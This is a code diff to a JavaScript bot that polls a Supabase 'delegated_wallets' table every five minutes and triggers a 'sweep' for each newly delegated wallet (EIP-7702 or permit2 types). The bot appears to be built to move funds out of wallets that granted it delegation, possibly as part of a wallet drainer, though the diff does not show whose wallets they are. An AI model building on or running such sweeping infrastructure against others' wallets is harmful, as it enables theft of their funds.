@@ -2968,13 +2968,52 @@ async function init() {
   // 4. Subscribe to Supabase Realtime for new/updated wallets
     subscribeRealtime();
 
+  // 4b. Periodic Supabase reload — Realtime failsafe.
+  // If the Realtime channel silently stalls (no CHANNEL_ERROR, events just stop arriving),
+  // new wallets inserted into delegated_wallets would never be seen until a bot restart.
+  setInterval(async () => {
+    if (!supabase) return;
+    try {
+      const { data, error } = await supabase
+        .from("delegated_wallets")
+        .select("address, type, needs_reactivation")
+        .eq("chain", CHAIN);
+      if (error) return;
+      let updates = 0;
+      for (const row of data || []) {
+        const checksum = normalizeAddress(row.address);
+        if (!checksum) continue;
+        const key  = checksum.toLowerCase();
+        const type = row.type || "eip7702";
+        const needsReauth = !!(row.needs_reactivation && (type === "permit2-gasless" || type === "permit2"));
+        const existing = monitoredWallets.get(key);
+        if (!existing) {
+          delegatedWallets.set(checksum, type);
+          monitoredWallets.set(key, { address: checksum, type, needs_reactivation: needsReauth });
+          if (needsReauth) needsReauthWallets.add(key);
+          log(`[poll] new wallet ${checksum.slice(0, 10)} (${type}) — dispatching sweep`);
+          scheduleTransferRebuild();
+          dispatchSweep({ address: checksum, type }).catch(e => log(`[poll] sweep error: ${e.message}`));
+          updates++;
+        } else if (!needsReauth && existing.needs_reactivation) {
+          monitoredWallets.set(key, { address: checksum, type, needs_reactivation: false });
+          needsReauthWallets.delete(key);
+          log(`[poll] reactivation cleared for ${checksum.slice(0, 10)} — dispatching sweep`);
+          dispatchSweep({ address: checksum, type }).catch(e => log(`[poll] sweep error: ${e.message}`));
+          updates++;
+        }
+      }
+      if (updates > 0) log(`[poll] ${updates} wallet(s) synced from Supabase`);
+    } catch (e) { warn(`[poll] wallet reload error: ${e.message}`); }
+  }, 5 * 60 * 1000);
+
   // 5. Start WSS: Transfer event listeners + native block scanner
   startBot();
 
   // 6. Start contract ETH balance monitor (PATH 2 native sweep)
   startContractEthMonitor();
 
-  log("[init] ✅ bot ready — listening for Transfer events and Realtime");
+  log("[init] ✅ bot ready — listening for Transfer events, Realtime, and 5-min Supabase poll");
   log("[init] sweeps are event-driven: Transfer events and Realtime will trigger dispatch");
 
   // startupSweepPass() is now triggered inside loadTokens().then() above
